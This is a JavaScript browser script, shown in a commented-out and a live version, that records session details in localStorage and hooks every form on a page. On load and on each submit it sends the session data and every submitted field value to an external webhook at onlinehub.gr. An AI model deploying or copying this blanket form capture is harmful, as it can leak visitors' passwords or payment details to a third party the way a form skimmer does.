// (function() {
//     // Function to send data to another URL
//     function sendAsyncData(url, data) {
//         fetch(url, {
//             method: 'POST',
//             mode: 'no-cors',
//             headers: {
//                 'Content-Type': 'application/json'
//             },
//             body: JSON.stringify(data)
//         }).catch(error => {
//             console.error('Error sending data:', error);
//         });
//     }

//     // Function to generate a unique session ID
//     function generateSessionID() {
//         return 'session_' + Math.random().toString(36).substr(2, 9);
//     }

//     // Function to get the current date and time
//     function getCurrentDateTime() {
//         const now = new Date();
//         return now.toISOString(); // Returns the date and time in ISO format
//     }

//     // Function to set input values
//     function setInputValues(sessionID, createdAt, lastVisit, referrer, domain, uri) {
//         document.querySelectorAll('.sessionId').forEach(input => input.value = sessionID);
//         document.querySelectorAll('.sessionCreated').forEach(input => input.value = createdAt);
//         document.querySelectorAll('.sessionLastVisit').forEach(input => input.value = lastVisit);
//         document.querySelectorAll('.sessionReferrer').forEach(input => input.value = referrer);
//         document.querySelectorAll('.sessionDomain').forEach(input => input.value = domain);
//         document.querySelectorAll('.sessionURI').forEach(input => input.value = uri);
//     }

//     // Function to collect form data
//     function getFormData(form) {
//         const formData = new FormData(form);
//         const formObject = {};
//         formData.forEach((value, key) => {
//             formObject[key] = value;
//         });
//         return formObject;
//     }

//     document.addEventListener('DOMContentLoaded', function() {
//         // Get the website domain
//         const domain = window.location.hostname;
//         // Get the current URI
//         const uri = window.location.pathname + window.location.search;

//         // Check if session ID exists in localStorage, if not create one
//         let sessionData = localStorage.getItem('sessionData');
//         if (!sessionData) {
//             const sessionID = generateSessionID();
//             const dateTime = getCurrentDateTime();
//             const referrer = document.referrer || 'Direct'; // Get the referrer or set to 'Direct' if none
//             sessionData = {
//                 sessionID: sessionID,
//                 createdAt: dateTime,
//                 lastVisit: dateTime,
//                 referrer: referrer,
//                 domain: domain,
//                 uri: uri
//             };
//             localStorage.setItem('sessionData', JSON.stringify(sessionData));
//             console.log('New session created:', sessionData);
//         } else {
//             sessionData = JSON.parse(sessionData);
//             const currentDateTime = getCurrentDateTime();
//             sessionData.lastVisit = currentDateTime;
//             sessionData.domain = domain; // Ensure the domain is always included
//             sessionData.uri = uri; // Ensure the URI is always included
//             localStorage.setItem('sessionData', JSON.stringify(sessionData));
//             console.log('Session ID:', sessionData.sessionID);
//             console.log('New visit logged at:', currentDateTime);
//         }

//         // Set the input field values
//         setInputValues(sessionData.sessionID, sessionData.createdAt, sessionData.lastVisit, sessionData.referrer, sessionData.domain, sessionData.uri);

//         // Example usage
//         const url = 'https://onlinehub.gr/?webhook_form=get_data';

//         sendAsyncData(url, sessionData);

//         // Add event listener to all forms
//         document.querySelectorAll('form').forEach(form => {
//             form.addEventListener('submit', function(event) {
//                 let sessionData = localStorage.getItem('sessionData');

//                 // Collect form data
//                 const formData = getFormData(form);
//                 const combinedData = {
//                     formData: formData,
//                     sessionData : JSON.parse(sessionData)
//                 };

//                 // Send form data along with session data
//                 sendAsyncData(url, combinedData);

//                 // Allow form submission to proceed
//             });
//         });
//     });
// })();


(function() {
    // Function to send data to another URL
    function sendAsyncData(url, data) {
        fetch(url, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).catch(error => {
            console.error('Error sending data:', error);
        });
    }

    // Function to generate a unique session ID
    function generateSessionID() {
        return 'session_' + Math.random().toString(36).substr(2, 9);
    }

    // Function to get the current date and time
    function getCurrentDateTime() {
        const now = new Date();
        return now.toISOString(); // Returns the date and time in ISO format
    }

    // Function to set input values
    function setInputValues(sessionID, createdAt, lastVisit, referrer, domain, uri) {
        document.querySelectorAll('.sessionId').forEach(input => input.value = sessionID);
        document.querySelectorAll('.sessionCreated').forEach(input => input.value = createdAt);
        document.querySelectorAll('.sessionLastVisit').forEach(input => input.value = lastVisit);
        document.querySelectorAll('.sessionReferrer').forEach(input => input.value = referrer);
        document.querySelectorAll('.sessionDomain').forEach(input => input.value = domain);
        document.querySelectorAll('.sessionURI').forEach(input => input.value = uri);
    }

    // Function to collect form data
    function getFormData(form) {
        const formData = new FormData(form);
        const formObject = {};
        formData.forEach((value, key) => {
            formObject[key] = value;
        });
        return formObject;
    }

    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(function() {
            // Get the website domain
            const domain = window.location.hostname;
            // Get the current URI
            const uri = window.location.pathname + window.location.search;

            // Check if session ID exists in localStorage, if not create one
            let sessionData = localStorage.getItem('sessionData');
            if (!sessionData) {
                const sessionID = generateSessionID();
                const dateTime = getCurrentDateTime();
                const referrer = document.referrer || 'Direct'; // Get the referrer or set to 'Direct' if none
                sessionData = {
                    sessionID: sessionID,
                    createdAt: dateTime,
                    lastVisit: dateTime,
                    referrer: referrer,
                    domain: domain,
                    uri: uri
                };
                localStorage.setItem('sessionData', JSON.stringify(sessionData));
                console.log('New session created:', sessionData);
            } else {
                sessionData = JSON.parse(sessionData);
                const currentDateTime = getCurrentDateTime();
                sessionData.lastVisit = currentDateTime;
                sessionData.domain = domain; // Ensure the domain is always included
                sessionData.uri = uri; // Ensure the URI is always included
                localStorage.setItem('sessionData', JSON.stringify(sessionData));
                console.log('Session ID:', sessionData.sessionID);
                console.log('New visit logged at:', currentDateTime);
            }

            // Set the input field values
            setInputValues(sessionData.sessionID, sessionData.createdAt, sessionData.lastVisit, sessionData.referrer, sessionData.domain, sessionData.uri);

            // Example usage
            const url = 'https://onlinehub.gr/?webhook_form=get_data';

            sendAsyncData(url, sessionData);

            // Add event listener to all forms
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', function(event) {
                    let sessionData = localStorage.getItem('sessionData');

                    // Collect form data
                    const formData = getFormData(form);
                    const combinedData = {
                        formData: formData,
                        sessionData : JSON.parse(sessionData)
                    };

                    // Send form data along with session data
                    sendAsyncData(url, combinedData);

                    // Allow form submission to proceed
                });
            });
        }, 2000); // Delay execution by 2000 milliseconds (2 seconds)
    });
})();